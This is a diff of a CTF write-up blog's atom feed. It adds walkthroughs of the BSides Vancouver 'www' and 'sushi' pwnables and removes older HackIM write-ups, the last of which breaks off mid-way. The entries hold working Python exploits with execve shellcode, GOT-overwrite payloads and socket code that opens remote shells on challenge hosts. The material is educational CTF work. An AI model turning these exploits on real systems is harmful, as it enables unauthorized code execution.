@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-02-22T18:21:49+01:00</updated>
+  <updated>2015-03-18T20:55:20+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,265 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
+    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
+    <updated>2015-03-18T20:36:56+01:00</updated>
+    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
+    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>
+
+<!-- more -->
+
+
+<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>
+
+<pre><code class="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>
+
+<pre><code class="bash">gdb-peda$ r
+Welcome to www! Please give me two strings to have them echoed back to you!
+buffers at 0xffffd4c4 and 0xffffd3c4, ready for input!
+AAAAAA
+BBBBBB
+AAAAAA
+
+BBBBBB
+
+Stack canary created: &gt;tC[hbw]
+Better luck next time, eh?
+</code></pre>
+
+<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>
+
+<pre><code>0804873c &lt;copybuf&gt;:
+ 804873c:   55                      push   ebp
+ 804873d:   89 e5                   mov    ebp,esp
+ 804873f:   83 ec 38                sub    esp,0x38
+ 8048742:   c7 44 24 08 09 00 00    mov    DWORD PTR [esp+0x8],0x9
+ 8048749:   00 
+ 804874a:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
+ 8048751:   08 
+ 8048752:   8d 45 eb                lea    eax,[ebp-0x15]
+ 8048755:   89 04 24                mov    DWORD PTR [esp],eax
+ 8048758:   e8 c3 fe ff ff          call   8048620 &lt;strncpy@plt&gt;
+ 804875d:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
+ 8048760:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 8048764:   8d 45 db                lea    eax,[ebp-0x25]                ; first buffer is copied here
+ 8048767:   89 04 24                mov    DWORD PTR [esp],eax
+ 804876a:   e8 41 fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
+ 804876f:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]       ; ebp+0xc = second input
+ 8048772:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax          
+ 8048776:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]       ; overflow this pointer with exit@got
+ 8048779:   89 04 24                mov    DWORD PTR [esp],eax
+ 804877c:   e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
+ ; check_cookie:
+ 8048781:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
+ 8048788:   08 
+ 8048789:   8d 45 eb                lea    eax,[ebp-0x15]
+ 804878c:   89 04 24                mov    DWORD PTR [esp],eax
+ 804878f:   e8 bc fd ff ff          call   8048550 &lt;strcmp@plt&gt;
+ 8048794:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+ 8048797:   83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
+ 804879b:   74 18                   je     80487b5 &lt;copybuf+0x79&gt;        ; if canary check fails, call exit@plt -&gt; overwrite
+ 804879d:   c7 04 24 30 8a 04 08    mov    DWORD PTR [esp],0x8048a30
+ 80487a4:   e8 17 fe ff ff          call   80485c0 &lt;puts@plt&gt;
+ 80487a9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
+ 80487b0:   e8 2b fe ff ff          call   80485e0 &lt;exit@plt&gt;
+ ; cookie_OK:
+ 80487b5:   c9                      leave  
+ 80487b6:   c3                      ret    
+</code></pre>
+
+<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite on of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I choose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>
+
+<p>Putting it all together:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+def pQ(x):
+    return struct.pack('&lt;Q', x)
+
+s=socket(AF_INET, SOCK_STREAM)
+#s.connect(('localhost', 17284))
+s.connect(('www.termsec.net', 17284))
+
+buf = s.recv(200)
+
+m = re.findall('(0x[0-9a-f]+)', buf)
+buf1_addr = int(m[0], 16)
+buf2_addr = int(m[1], 16)
+
+print "[~] buf1: 0x%lx" % buf1_addr
+print "[~] buf2: 0x%lx" % buf2_addr
+
+# first input will overwrite the pointer that is used for the second strcpy 
+payload = ""
+payload += "A"*45       # padding
+payload += p(0x8049d10) # we'll overwrite exit@plt
+payload += p(buf2_addr) # restore this on the stack, otherwise it will be partially overwritten
+
+s.send(payload + "\n")
+
+# second input, used in second strcpy. By now, that strcpy will call:
+# strcpy(0x8049d10, buffer2)
+payload = ""
+payload += p(buf2_addr+4)   # overwrite exit@plt with the address where the shellcode starts
+payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
+
+s.send(payload + "\n")
+s.recv(200)
+
+print "[!] enjoy your shell"
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+s.close()
+</code></pre>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/www-200$ python ./www.py
+[~] buf1: 0xbfa660d4
+[~] buf2: 0xbfa65fd4
+
+[!] enjoy your shell
+id
+/bin//sh: 1: id: not found
+cat flag.txt
+flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
+    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
+    <updated>2015-03-18T20:15:54+01:00</updated>
+    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
+    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>
+
+<!-- more -->
+
+
+<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>
+
+<pre><code class="bash">Deposit money for sushi here: 0x7ffc068ccfe0
+aaaaaaaa
+Sorry, $0.97 is not enough.
+</code></pre>
+
+<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>
+
+<pre><code class="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "".join(["%04d" % x for x in range(200)])' | ./sushi
+Deposit money for sushi here: 0x7ffd0aa1edb0
+Sorry, $0.48 is not enough.
+Segmentation fault (core dumped)
+bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
+...snip...
+Core was generated by `./sushi'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x00000000004005f2 in ?? ()
+gdb-peda$ x/i $rip
+=&gt; 0x4005f2:    ret    
+gdb-peda$ x/2wx $rsp
+0x7ffd0aa1edf8: 0x38313030  0x39313030
+</code></pre>
+
+<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "A"*(18*4)+"BBBBCCCC"' | ./sushi
+Deposit money for sushi here: 0x7ffdcfd360b0
+Sorry, $0.65 is not enough.
+Segmentation fault (core dumped)
+bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
+...snip...
+Core was generated by `./sushi'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x00000000004005f2 in ?? ()
+gdb-peda$ x/2wx $rsp
+0x7ffdcfd360f8: 0x42424242  0x43434343
+gdb-peda$ x/s 0x7ffdcfd360b0
+0x7ffdcfd360b0:  'A' &lt;repeats 72 times&gt;, "BBBBCCCC"
+</code></pre>
+
+<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>
+
+<p>The program uses <code>gets()</code> to get the input:</p>
+
+<pre><code class="bash">0x4005c5:  call  0x400480 &lt;gets@plt&gt;
+</code></pre>
+
+<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>
+
+<pre><code class="bash">$ socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
+</code></pre>
+
+<p>Next was writing a simple exploit in python:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+def pQ(x):
+    return struct.pack('&lt;Q', x)
+
+s=socket(AF_INET, SOCK_STREAM)
+#s.connect(('localhost', 4000))
+s.connect(('sushi.termsec.net', 4000))
+
+buf = s.recv(1000)
+stack_addr = int(re.search('(0x[0-9a-f]+)', buf).group(1), 16)
+
+print "[~] stack addr: 0x%lx" % stack_addr
+
+# simple x64 execve shellcode
+shellcode = "\x31\xc0\48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+# payload must overflow saved return address on stack
+payload = shellcode + "A" * (72 - len(shellcode))
+# we're given the address of our (executable!) buffer on the stack, so use that as return address
+payload += pQ(stack_addr) + "\n"
+
+s.send(payload)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+s.close()
+</code></pre>
+
+<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python ./sushi.py 
+[~] stack addr: 0x7fffb3fc0480
+Sorry, $0.49 is not enough.
+cat flag.txt
+flag{I_l3ft_my_wallet_in_#irc}
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
@@ -2096,763 +2355,6 @@ d3sp3r4t3_sh3llc0d3
 </code></pre>
 
 <p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
-    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
-    <updated>2015-01-11T21:40:18+01:00</updated>
-    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
-    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>
-
-<!-- more -->
-
-
-<p></p>
-
-<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>
-
-<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
-You want to store some Notes??
-Well, we present you the Sherlock's MentalPad --&gt;
-Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
-NOTE: It has a limit though
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-</code></pre>
-
-<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>
-
-<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>
-
-<pre><code>You want to store some Notes??
-Well, we present you the Sherlock's MentalPad --&gt;
-Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
-NOTE: It has a limit though
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-1
-Give the type of the Note:
-1
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-1
-Give the type of the Note:
-1
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-3
-Give the Note id to edit:
-0
-Give the type to edit:
-2
-Give your Note:
-AAAA
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-3
-Give the Note id to edit:
-1
-Give the type to edit:
-2
-Give your Note:
-BBBB
-Please enter one of the following option:
-</code></pre>
-
-<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>
-
-<pre><code>gdb-peda$ x/60w 0x804d0c0
-0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
-0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
-0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>
-
-<pre><code class="c">struct note {
-    note *next_note;
-    note *prev_note;
-    char note_content[MAX_LENGTH];
-};
-</code></pre>
-
-<p>I sent a stupidly large input to overflow these notes:</p>
-
-<pre><code>gdb-peda$ r
-You want to store some Notes??
-Well, we present you the Sherlock's MentalPad --&gt;
-Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
-NOTE: It has a limit though
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-1
-Give the type of the Note:
-1
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-1
-Give the type of the Note:
-1
-Please enter one of the following option:
-1 to add a Note.
-2 to delete a Note.
-3 to edit a Note.
-4 to show a Note.
-5 to exit.
-Your Choice:
-3
-Give the Note id to edit:
-0
-Give the type to edit:
-2
-Give your Note:
-AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB
-</code></pre>
-
-<p>The heap for note two now looks like this:</p>
-
-<pre><code>gdb-peda$ x/60wx 0x804d0c0
-0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
-0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
-0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
-0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
-0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>
-
-<pre><code>gdb-peda$ vmmap
-Start      End        Perm  Name
-&lt;snip&gt;
-0x0804c000 0x0804e000 rwxp  [heap]
-</code></pre>
-
-<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>
-
-<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>
-
-<pre><code>gdb-peda$ x/60wx 0x804d0c0
-0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
-0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
-0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>
-
-<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>
-
-<p>The exploit:</p>
-
-<pre><code class="python">import struct
-import socket
-import time
-import re
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('54.163.248.69', 9004))
-
-s.recv(1000)
-time.sleep(0.5)
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-payload  = "1\n1\n1\n1\n"   # create two notes of type one
-payload += "3\n0\n2\n"      # edit note 0 as type two
-
-s.send(payload)
-time.sleep(0.5)
-
-# overflow note to line up to heap pointer
-s.send("A"*212+"BBB\n")
-
-time.sleep(0.5)
-s.recv(256)
-
-# leak heap addr
-print "[+] Trying to leaking heap address..."
-time.sleep(0.5)
-
-s.send("4\n0\n")
-time.sleep(0.5)
-
-data = s.recv(1000)
-
-# ugly.. but works :/
-m = re.search(r'.*BBB\n(....).*', data)
-if m:
-    heap = struct.unpack('&lt;L', m.group(1))[0]
-    print "[+] Leaked heap address at {}".format(hex(heap))
-    # offset for shellcode found empirically via gdb
-    shellcode = heap - 0xd0
-    print "[+] Shellcode at {}".format(hex(shellcode))
-else:
-    print "[!] Fatal: could not leak heap address"
-    exit(0)
-
-time.sleep(0.5)
-print "[+] Sending new notes to overwrite got pointer..."
-s.send("1\n1\n1\n1\n")  # create two more notes
-time.sleep(0.5)
-s.recv(1000)
-
-# send new note to overflow pointers
-s.send("3\n2\n2\n")
-time.sleep(0.5)
-s.recv(1000)
-
-time.sleep(0.5)
-payload = ""
-sc = "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
-# prepend shellcode with a little NOP sled
-payload += "\x90"*(212-len(sc))
-payload += sc
-# overwrite note_info struct
-payload += p(0x804b024-8)     # __isoc99_scanf@got.plt-8
-payload += p(shellcode)       # heap location of shellcode
-
-payload += "\n"
-s.send(payload)
-
-# request deletion of a note, triggering our write-what-where
-# we overwrite a function pointer in the got with the location
-# of our shellcode
-time.sleep(0.5)
-s.send("2\n3\n")
-
-time.sleep(0.5)
-s.recv(512)
-
-# shell incoming!
-print "[+] Enjoy your shell!"
-
-import telnetlib
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-
-s.close()
-</code></pre>
-
-<pre><code>bas@tritonal:~/tmp/nullcon/exp400$ python sploit.py 
-[+] Trying to leaking heap address...
-[+] Leaked heap address at 0x85cf1d0
-[+] Shellcode at 0x85cf100
-[+] Sending new notes to overwrite got pointer...
-[+] Enjoy your shell!
-id
-/bin//sh: 1: id: not found
-cat flag.txt
-flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
-</code></pre>
-
-<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
-    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
-    <updated>2015-01-11T18:52:35+01:00</updated>
-    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
-    <content type="html"><![CDATA[<p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>
-
-<!-- more -->
-
-
-<p>When started, <code>mixme</code> present the following:</p>
-
-<pre><code>==========================================
-======== Uncle Podger's Data Store =======
-==========================================
-
-Select op (store/get/edit/exit): store
-Name: a
-Size: 4
-Enter data: AAAA
-Select op (store/get/edit/exit): get
-Name: a
-Size: 4
-AAAASelect op (store/get/edit/exit): get
-Name: a
-Size: 4
-Not found
-Select op (store/get/edit/exit): Invalid input
-Select op (store/get/edit/exit): 
-</code></pre>
-
-<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>
-
-<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>
-
-<pre><code># allocated three notes, in heap:
-0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
-0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8314020:  0x08314030  0x083140a0  0x00000000  0x00000029
-0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
-0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
-0x8314050:  0x00000000  0x00000011  0x41414141  0x00000000
-0x8314060:  0x00000000  0x00000029  0x00000062  0x00000000
-0x8314070:  0x00000000  0x00000000  0x00000004  0x08314090
-0x8314080:  0x083140a0  0x08314030  0x00000000  0x00000011
-0x8314090:  0x42424242  0x00000000  0x00000000  0x00000029
-0x83140a0:  0x00000063  0x00000000  0x00000000  0x00000000
-0x83140b0:  0x00000004  0x083140c8  0x08314008  0x08314068
-0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
-0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
-0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>
-
-<pre><code class="c">note_info struct {
-    char name[16];
-    int length;
-    char *content;
-    note_info *next_note;
-    note_info *prev_note;
-};
-</code></pre>
-
-<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>
-
-<h2>Overflowing the heap</h2>
-
-<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>
-
-<pre><code># after editing 'a' with 40 bytes where 4 is allocated:
-0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
-0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
-0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
-0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
-0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
-0x8314060:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8314070:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
-0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
-0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
-0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
-0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>
-
-<pre><code># set 'a' with large buffer, overwriting meta-data of 'b':
-0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
-0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
-0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
-0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
-0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
-0x8314060:  0x41414141  0x00000029  0x00000062  0x41414141
-0x8314070:  0x41414141  0x41414141  0x00000024  0x08314090
-0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
-0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
-0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
-0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
-0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>
-
-<h2>Control of execution</h2>
-
-<p>I tested this hypothesis with the following python:</p>
-
-<pre><code class="python">import re
-import string
-import struct
-import socket
-import time
-import telnetlib
-import sys
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-# function to send commands to the binary
-def z(sock, x):
-    sock.send(x + '\n')
-    time.sleep(0.01)
-    data = sock.recv(200)
-    time.sleep(0.01)
-    return data
-
-# connect to remote host
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('localhost', 9005))
-
-# receive banner
-s.recv(512)
-
-# ask the binary to store three notes
-# we'll overflow a into b later on
-z(s, "store")
-z(s, "a")
-z(s, "4")
-z(s, "AAAA")
-
-z(s, "store")
-z(s, "b")
-z(s, "4")
-z(s, "BBBB")
-
-z(s, "store")
-z(s, "c")
-z(s, "4")
-z(s, "CCCC")
-
-# edit a with a large value
-# this overflows and overwrites the note_info struct of b
-# the pointer to the data is overwriting with free@got
-print "[+] overflowing a to set b to free@got"
-z(s, 'edit')
-z(s, 'a')
-z(s, '40')
-z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
-#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got
-
-# overwrite free@got with printf
-print "[+] replacing free() with printf()"
-z(s, 'edit')
-z(s, 'b')
-z(s, '4')
-z(s, 'BBBB')
-
-z(s, 'get')
-z(s, 'c')
-z(s, '4')
-</code></pre>
-
-<p>This made the binary crash. The coredump reported the following:</p>
-
-<pre><code class="python">#0  0x42424242 in ?? ()
-gdb-peda$ i r
-eax            0x843b0c8    0x843b0c8
-ecx            0x843b0c8    0x843b0c8
-edx            0x4  0x4
-ebx            0xb779cff4   0xb779cff4
-esp            0xbf95245c   0xbf95245c
-ebp            0xbf952498   0xbf952498
-esi            0x0  0x0
-edi            0x0  0x0
-eip            0x42424242   0x42424242
-eflags         0x10207  [ CF PF IF RF ]
